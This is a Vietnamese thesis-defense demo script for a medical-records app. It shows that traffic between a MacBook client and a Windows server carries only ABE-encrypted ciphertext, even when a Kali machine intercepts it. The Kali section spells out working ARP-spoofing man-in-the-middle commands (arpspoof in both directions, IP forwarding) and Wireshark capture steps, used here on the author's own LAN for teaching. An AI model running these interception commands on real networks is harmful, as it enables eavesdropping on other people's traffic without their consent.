# Kịch bản demo đồ án: Kali bắt gói tin khi MacBook nhập liệu — dữ liệu vẫn mã hoá ABE

Demo giáo dục/bảo vệ đồ án, chạy trên mạng LAN của chính mình. Mục tiêu: cho hội đồng thấy gói tin bị **bắt trọn trên đường
truyền**, nhưng nội dung là **ciphertext** — vì dữ liệu đã mã hoá AES-256-GCM + CP-ABE **ngay trên máy nhập liệu** trước khi gửi;
cả máy chủ lẫn kẻ nghe lén đều không có khoá để đọc.

## Ba thiết bị

```
① Máy chủ + ADMIN   = PC Windows của bạn. Chạy KSK.exe. Giữ ciphertext, cấp khoá, theo dõi an ninh.
② Máy nhập liệu      = MacBook. Chạy app nhân viên từ mã nguồn. Bác sĩ/tiếp đón nhập hồ sơ.
③ Kẻ tấn công        = Kali (máy ảo trên PC của bạn, chế độ Bridged → như một máy thứ ba thật trên LAN).
```

**Điều kiện mạng bắt buộc:** cả 3 cùng một Wi-Fi **không bật Client/AP Isolation**. → **Dùng điểm phát Wi-Fi từ điện thoại của
bạn** cho cả 3 thiết bị. Wi-Fi trường/quán thường cách ly máy với nhau nên ARP spoof sẽ không chạy.

Quy ước IP (xem lại bằng `ipconfig`/`ip a`, rồi thay số thật vào mọi lệnh):
`Máy chủ = 192.168.1.10`, `MacBook = 192.168.1.20`, `Kali = 192.168.1.30`.

---

## ① MÁY CHỦ + ADMIN (PC Windows của bạn)

### A. Khởi động (làm trước)
```powershell
# Mở app + máy chủ nhúng (xoá biến môi trường gây tự thoát khi mở bằng lệnh)
Remove-Item Env:ELECTRON_RUN_AS_NODE -ErrorAction SilentlyContinue
Start-Process 'E:\TLCN\medabe\release\KSK-win32-x64\KSK.exe' -WorkingDirectory 'E:\TLCN\medabe'

# Một lần: mở tường lửa cho LAN (đồng ý hộp Administrator)
E:\TLCN\medabe\Cau-Hinh-Mang-LAN.cmd

# Xem IP để đọc cho MacBook và Kali
ipconfig | findstr IPv4
```
Trong app, vào **🔒 Quản trị bảo mật → Quản trị cấp quyền**, nhập mật khẩu admin. Kiểm tra **Đăng ký máy mới = ĐANG BẬT**
để MacBook tự đăng ký được. Vào **Import Excel** nạp sẵn vài hồ sơ giả (hoặc đã có sẵn) để có dữ liệu demo.

### B. Admin "theo dõi" trong lúc demo (3 cách, chiếu màn hình cho hội đồng)

**B1 — Giám sát an ninh (SIEM) trong app:** vào **🔒 Quản trị bảo mật → Giám sát an ninh**. Ở đây hiện các sự kiện: MacBook
đăng ký thiết bị, mỗi lần truy cập bị từ chối (ACCESS_DENIED), giải mã thất bại... Khi demo, mỗi thao tác của MacBook sẽ đẩy
sự kiện lên đây gần như tức thì.

**B2 — Khung "máy chủ thấy gì" ở Quản lý hồ sơ:** vào **Quản lý hồ sơ**, chọn đúng học sinh MacBook vừa nhập. **Khung trái** =
dữ liệu đã giải mã trên máy admin (admin có quyền). **Khung phải** = đúng thứ máy chủ lưu: `patientIdx` (HMAC, không phải CCCD),
`policy` (công khai), `ciphertext` (hex). Đây là bằng chứng máy chủ **không giữ bản rõ**.

**B3 — Nhìn thẳng vào ổ đĩa máy chủ (thuyết phục nhất):** mở PowerShell:
```powershell
$d = "$env:APPDATA\KSK\server-data"
# Theo dõi log máy chủ chạy trực tiếp (để cửa sổ này mở suốt lúc demo)
Get-Content "$d\server.log" -Wait -Tail 20
```
Cửa sổ khác — chứng minh file dữ liệu không chứa tên/CCCD học sinh:
```powershell
$d = "$env:APPDATA\KSK\server-data"
# Tìm tên/CCCD học sinh trong CSDL thật của máy chủ: phải KHÔNG thấy
Select-String -Path "$d\db\medabe.mv.db" -Pattern 'NGUYEN','012345678901' -Encoding Byte -List
# Nhật ký SIEM dạng JSON (sự kiện an ninh có thật, nhưng không có nội dung hồ sơ)
Get-Content "$d\siem\events.jsonl" -Tail 10
```
> Nói: "CSDL của máy chủ nằm ngay đây, mở ra tìm tên bệnh nhân cũng không có — chỉ toàn ciphertext và chỉ mục băm."

---

## ② MÁY NHẬP LIỆU (MacBook)

App Windows `.exe` không chạy trên Mac, nên Mac chạy **từ mã nguồn** (Electron). Cần **Node.js LTS** (cài một lần từ
https://nodejs.org).

### Chuẩn bị
1. Chép thư mục mã nguồn `medabe` (bản zip không kèm `node_modules`) sang Mac, giải nén vào `~/Downloads/medabe`.
2. Mở **Terminal**:
```bash
cd ~/Downloads/medabe
chmod +x Chay-KSK-NhanVien-Mac.command
./Chay-KSK-NhanVien-Mac.command http://192.168.1.10:8090     # IP máy chủ
```
Lần đầu mất vài phút (tải Electron cho Mac). macOS hỏi quyền **Keychain** → chọn *Always Allow* (app cất khoá thiết bị bằng
Keychain). Thấy thanh **"● Đã kết nối: http://192.168.1.10:8090"** là đạt. Chọn đúng **Công ty** giống máy chủ.

### Thao tác lúc demo (làm khi Kali đã bắt đầu bắt gói)
1. Mở **Khám sức khỏe định kỳ**, chọn một học sinh → **✎ Sửa**.
2. Nhập **Chiều cao, Cân nặng** (mục Khám thể lực) → **💾 Lưu**. → sinh gói `POST /api/records` lên cổng **8090**.
3. Mở **Quản lý hồ sơ** → chọn học sinh đó → bấm **Gửi liên thông** (hoặc lưu mục khám tự liên thông). → sinh gói
   `POST /byt/submit` lên cổng **8095**.

---

## ③ KẺ TẤN CÔNG (Kali, máy ảo Bridged trên PC của bạn)

Kali đứng cùng LAN nhưng switch/Wi-Fi chỉ giao gói đúng người nhận, nên phải **chen vào giữa bằng ARP spoofing** mới bắt được
gói MacBook↔máy chủ.

### Cấu hình máy ảo (làm trước, không làm live)
Tắt Kali → Settings → Network → Adapter: **Bridged** + Advanced → **Promiscuous Mode: Allow All** → bật lại Kali.

### Các lệnh (thay IP + tên card `eth0` cho đúng)
```bash
# 0. Xem card mạng + IP của Kali, và tìm 2 máy kia trên LAN
ip a
sudo arp-scan --localnet

# 1. Bật chuyển tiếp gói (BẮT BUỘC, nếu không MacBook mất mạng → lộ demo)
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Đứng giữa MacBook và máy chủ — mở 2 terminal, mỗi lệnh một terminal, để chạy liên tục
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.10     # lừa MacBook: "máy chủ là tôi"
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.20     # lừa máy chủ: "MacBook là tôi"

# 3. Terminal thứ 3 — mở Wireshark và lọc đúng 2 cổng
sudo wireshark &
#   Bộ lọc dán vào ô Filter:
#   ip.addr == 192.168.1.20 && (tcp.port == 8090 || tcp.port == 8095)
#   → Start capture (nút cá mập xanh)
```
Sau khi MacBook Lưu + Gửi liên thông: trong Wireshark **Stop**, lọc `http`, chuột phải dòng **POST /api/records** →
**Follow → HTTP Stream**.

### Thấy gì
```json
{
  "patientIdx": "55ca0ba58c66fb8f...",            // HMAC, không phải CCCD
  "type": "thecuc",
  "envelope": {
    "abe": { "policy": "MED:Role:BacSi#... OR ...", "rows": ["..."] },
    "wrapIv": "8f3a...", "wrappedDek": "c91e...",
    "iv": "0d7b...", "ciphertext": "4a2f8e9c7d1b..."   // hex ngẫu nhiên
  }
}
```
Không có tên, số đo, CCCD. Bằng chứng mạnh: **Edit → Find Packet**, gõ tên học sinh hoặc CCCD → **"No packet contains that
string"** trên toàn bộ dữ liệu đã bắt.

### Dọn sau demo
Ctrl+C hai lệnh `arpspoof` (tự khôi phục ARP cho MacBook và máy chủ), rồi:
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Trình tự diễn (dòng thời gian)

| # | Ai | Làm gì | Hội đồng thấy |
|---|---|---|---|
| 1 | Máy chủ | Mở KSK.exe, mở *Giám sát an ninh* + cửa sổ `server.log -Wait` | Máy chủ sẵn sàng, đang ghi log |
| 2 | MacBook | Mở app, kết nối, chọn Công ty | Mac tự đăng ký; SIEM trên máy chủ hiện sự kiện đăng ký |
| 3 | Kali | ip_forward=1 → 2 lệnh arpspoof → Wireshark Start | Kali đã đứng giữa, đang bắt |
| 4 | MacBook | Sửa 1 học sinh, nhập số đo, **Lưu** | Gói POST /api/records chạy qua Kali |
| 5 | MacBook | **Gửi liên thông** | Gói POST /byt/submit (cổng 8095) chạy qua Kali |
| 6 | Kali | Stop → Follow HTTP Stream → Find tên học sinh | **ciphertext**, "No packet contains that string" |
| 7 | Máy chủ | Quản lý hồ sơ → khung phải; `Select-String` CSDL | Máy chủ cũng chỉ có ciphertext + HMAC |
| 8 | Máy chủ | Chọn học sinh, khung trái giải mã được | Có khoá đúng thì đọc được — đối chứng |

## Câu chốt khi trình bày

> "Gói tin bị bắt trọn vẹn trên đường truyền bằng Kali đứng giữa (ARP spoofing), và chính máy chủ cũng chỉ lưu đúng chuỗi đó.
> Không ai đọc được nội dung, vì dữ liệu đã mã hoá AES-256-GCM rồi bọc khoá bằng CP-ABE ngay trên máy nhập liệu — chỉ thiết bị
> có đúng thuộc tính (vai trò/khoa) và được ≥ 2/3 nút cấp khoá đồng thuận mới mở được. Đây không phải ẩn trên giao diện: thư
> viện giải mã trực tiếp cũng thất bại nếu thiếu khoá — có bộ test tự động chứng minh (`npx vitest run security/src/abe/rw15.test.ts`)."

## Dự phòng nếu Kali không bắt được (Wi-Fi chặn ARP)

Bắt thẳng trên **máy chủ (PC Windows)** — card mạng máy chủ chắc chắn nhận mọi gói từ MacBook, không phụ thuộc Wi-Fi:
```powershell
# PowerShell Run as administrator
pktmon filter remove
pktmon filter add -p 8090
pktmon filter add -p 8095
pktmon start --capture --pkt-size 0 -f C:\capture.etl
#  >>> MacBook: Lưu + Gửi liên thông <<<
pktmon stop
pktmon etl2pcap C:\capture.etl -o C:\capture.pcap      # mở bằng Wireshark
```
Luận điểm đổi nhẹ ("kẻ tấn công đoạt quyền tại máy chủ" thay vì "máy thứ ba") nhưng vẫn chứng minh đúng điều cần: nội dung là
ciphertext.

## Lỗi hay gặp

| Hiện tượng | Xử lý |
|---|---|
| Kali không thấy gói nào | Wi-Fi bật Client Isolation → đổi sang hotspot điện thoại; hoặc dùng pktmon ở máy chủ |
| MacBook mất mạng khi spoof | Quên `ip_forward=1`, hoặc thiếu một trong hai lệnh arpspoof |
| MacBook báo `HARDWARE_MISMATCH` | Xoá `~/Library/Application Support/medabe` rồi chạy lại để đăng ký mới |
| Mac "Đã kết nối" nhưng danh sách trống | Chọn sai *Công ty*, hoặc máy chủ chưa import dữ liệu |
| App Mac không chạy | Chưa cài Node.js, hoặc lỡ chép `node_modules` từ Windows (xoá đi, chạy lại) |
| SIEM/khung phải trống | Chưa thao tác trên MacBook, hoặc chọn nhầm học sinh khác |
